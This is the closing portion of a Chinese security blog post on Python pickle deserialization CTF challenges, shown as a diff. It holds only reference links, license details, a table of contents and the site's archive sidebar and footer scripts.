+<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
+            </p><p>原文链接：<a href="https://wywwzjj.top/2019/10/24/Python-pickle-反序列化实例分析/">https://wywwzjj.top/2019/10/24/Python-pickle-反序列化实例分析/</a>
+            </p><p>发表日期：<a href="https://wywwzjj.top/2019/10/24/Python-pickle-反序列化实例分析/">October 24th 2019, 10:26:07 am</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2019/10/24/Python-pickle-反序列化实例分析/">November 4th 2019, 10:27:17 am</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/11/06/BalsnCTF-2019-两道web题/" title="Balsn CTF 2019 两道 web 题">
+                    <div class="nextTitle">Balsn CTF 2019 两道 web 题</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/10/10/CSAPP-Chapter-3-Notes/" title="CSAPP 程序的机器级表示 笔记">
+                    <div class="prevTitle">CSAPP 程序的机器级表示 笔记</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="//github.com/wywwzjj" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title="qq">
+                  
+                  <img class="profile-qr" src="/assets/QQ.png">
+                </span>
+            
+        
+    
+        
+    
+        
+            
+                <a href="mailto:wywwzjj@gmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        
+        
+        <span id="busuanzi_container_site_pv" class="theme-info">
+            |&nbsp;&nbsp;总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;&nbsp;次
+        </span>
+        <span id="busuanzi_container_site_uv" class="theme-info">
+            &nbsp;&nbsp;|&nbsp;&nbsp;访客数&nbsp;<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;人次&nbsp;&nbsp;|
+        </span>
+        <!-- <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span> -->
+        
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#序列化与反序列化"><span class="toc-number">2.</span> <span class="toc-text">序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#序列化过程"><span class="toc-number">2.1.</span> <span class="toc-text">序列化过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化过程"><span class="toc-number">2.2.</span> <span class="toc-text">反序列化过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle-是什么？"><span class="toc-number">3.</span> <span class="toc-text">pickle 是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指令集"><span class="toc-number">3.2.</span> <span class="toc-text">指令集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何生成-pickle？"><span class="toc-number">4.</span> <span class="toc-text">如何生成 pickle？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手写"><span class="toc-number">4.1.</span> <span class="toc-text">手写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reduce"><span class="toc-number">4.2.</span> <span class="toc-text">_reduce_</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例分析"><span class="toc-number">5.</span> <span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-Guess-game"><span class="toc-number">5.1.</span> <span class="toc-text">SUCTF 2019 Guess_game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Breaking-2018-picklecode"><span class="toc-number">5.2.</span> <span class="toc-text">Code-Breaking 2018 picklecode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BalsnCTF-2019-Pyshv1"><span class="toc-number">5.3.</span> <span class="toc-text">BalsnCTF 2019 Pyshv1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BalsnCTF-2019-Pyshv2"><span class="toc-number">5.4.</span> <span class="toc-text">BalsnCTF 2019 Pyshv2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BalsnCTF-2019-Pyshv3"><span class="toc-number">5.5.</span> <span class="toc-text">BalsnCTF 2019 Pyshv3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 39
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2019/11/06/BalsnCTF-2019-两道web题/">Balsn CTF 2019 两道 web 题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href="/2019/10/24/Python-pickle-反序列化实例分析/">Python pickle 反序列化实例分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/10</span><a class="archive-post-title" href="/2019/10/10/CSAPP-Chapter-3-Notes/">CSAPP 程序的机器级表示 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/2019/09/08/CSAPP-Chapter-2-Notes/">CSAPP 信息的表示和处理 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href="/2019/09/01/CSAPP-Chapter-1-Notes/">CSAPP 计算机系统漫游 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href="/2019/08/20/当PHP反序列化遇上SSRF/">当 PHP 反序列化遇上 SSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2019/07/18/Discuz ML! V3.X RCE 分析/">Discuz ML! V3.X RCE 分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href="/2019/07/11/PHP-写入配置文件经典问题/">PHP 写入配置文件经典问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化学习/">phar 与反序列化学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/Redis-未授权访问相关利用/">Redis 未授权访问相关利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入总结/">命令注入总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span><a class="archive-post-title" href="/2019/04/07/vulnhub-靶机实战系列-HackInOS/">vulnhub 靶机实战系列 HackInOS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href="/2019/04/04/Leetcode-322-Coin-Change/">Leetcode 322.Coin Change[DP]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/无字母数字-webshell/">无字母数字 webshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/PHP-SECURITY-CALENDAR-2017/">PHP SECURITY CALENDAR Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/sqlmap-tamper-列表/">sqlmap tamper 列表</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2019/02/26/Jarvis-OJ-inject/">Jarvis OJ inject</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href="/2019/02/25/Jarvis-OJ-phpinfo/">Jarvis OJ phpinfo</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Hackme-Writeup/">Hackme-Web-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Jarvis-OJ-Writeup/">Jarvis OJ Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/01</span><a class="archive-post-title" href="/2019/02/01/Prompt-1-xss-通关记录/">Prompt 1 to win 通关记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ 2352 Stars[树状数组]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/2017-NJCTF-Guess/">2017 NJCTF web guess</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/Code-Breaking-Writeup/">Code Breaking Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/22</span><a class="archive-post-title" href="/2018/12/22/优雅实现哈夫曼编码/">优雅实现哈夫曼编码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href="/2018/12/08/Please_don't_stop_rua_233333/">Please don't stop rua 233333</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/30</span><a class="archive-post-title" href="/2018/11/30/Docker-常用命令/">Docker-常用命令清单</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href="/2018/11/23/漏洞练习平台及工具/">漏洞练习平台及工具</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/2018/11/02/Sqli-labs-通关记录/">Sqli-labs 通关笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/2018/10/23/Raccoon-Writeup/">Raccoon web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href="/2018/10/02/学习一项技能要花多少时间/">学习一项技能要花多少时间？</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/2018/09/26/Bugku-Web-Writeup/">Bugku Web 部分WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href="/2018/07/28/ACM-常用Trick/">ACM 常用小 Trick</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href="/2018/05/16/十年学会编程/">Teach Yourself Programming in Ten Years</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href="/2018/01/25/Hello-World/">Hello World</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="读书笔记"><span class="iconfont-archer">&#xe606;</span>读书笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "wywwzjj"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
